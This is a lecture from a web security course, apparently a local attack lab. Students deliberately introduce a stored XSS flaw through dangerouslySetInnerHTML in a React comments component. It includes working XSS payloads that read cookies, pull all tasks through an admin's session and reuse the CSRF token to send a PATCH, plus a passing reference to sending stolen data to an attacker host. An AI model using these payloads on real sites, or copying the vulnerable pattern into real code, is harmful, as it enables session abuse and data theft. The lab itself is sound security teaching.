# Lecture 26.03 · 🔓 Lab: Stored XSS Through `dangerouslySetInnerHTML` in Comments

> **Section:** S26 · **Type:** 🔓 Attack Lab · **Track:** ★ Core · **Time:** ~40 minutes
> ⚠️ **Local only.** Your own TaskFlow, on `localhost`, with the mock API. Revert the vulnerable change at the end.

---

## 1. The "feature request"

> "Users want **bold** in comments. Just render the HTML they type!"

A developer changes one line in `CommentsSection.tsx`:

```tsx
// ❌ VULNERABLE: do this only in your lab branch
<p dangerouslySetInnerHTML={{ __html: comment.body }} />
```

Create a branch first: `git switch -c lab/stored-xss`.

## 2. The attack

1. Start the mock with `--secure`. Log in as **bob** (`bob` / `bob123`) and open one of bob's tasks.
2. Post this comment:

   ```html
   Nice work! <img src=x onerror="alert('XSS as ' + document.cookie)">
   ```

3. The alert fires **for bob**, and for **every future viewer** of that task, because the payload is stored on the server. That's what "stored" means.

Now read the alert: `XSRF-TOKEN=…; tf_lang=…`. There's no `JSESSIONID` (HttpOnly, 24.07).

## 3. Escalate (still local): acting as the victim

Replace the payload with one that *uses* the session instead of stealing it:

```html
<img src=x onerror="
  fetch('/api/tasks?size=100').then(r => r.json()).then(page =>
    console.log('the attacker now has', page.items.length, 'tasks:', page.items.map(t => t.title)))">
```

Log out, log in as **admin** (`admin` / `admin123`), and open bob's task (admins see every task). The console lists **all** tasks: bob, an ordinary user, just read everything the admin can see, through the admin's own browser. That's the classic stored-XSS target: a low-privilege user attacking a high-privilege viewer. A real attacker would `fetch('https://attacker…', { method: 'POST', body })` instead of `console.log`.

Try a write, and see the CSRF defence fail against XSS:

```js
// in the payload: read the CSRF cookie like our own interceptor does, then send a PATCH as the viewer
const token = document.cookie.match(/XSRF-TOKEN=([^;]+)/)[1];
fetch('/api/tasks/1', { method: 'PATCH', headers: { 'Content-Type': 'application/json', 'X-XSRF-TOKEN': token },
  body: JSON.stringify({ title: 'pwned' }) });
```

It succeeds. The CSRF token proves "the request comes from our origin", and the script *is* our origin (24.10 §3).

## 4. What you learned

| Observation | Lesson |
|---|---|
| `onerror` ran without any `<script>` tag | block-listing `<script>` is useless: there are hundreds of vectors |
| every viewer is hit | stored XSS scales with your audience |
| no session cookie in the alert | HttpOnly helped: the attacker must act *now*, from the page |
| the PATCH worked with a valid CSRF header | CSRF defences don't stop XSS |
| the server stored the payload as typed | correct: the **renderer** must escape (the mock's comment in `server.mjs` says so) |
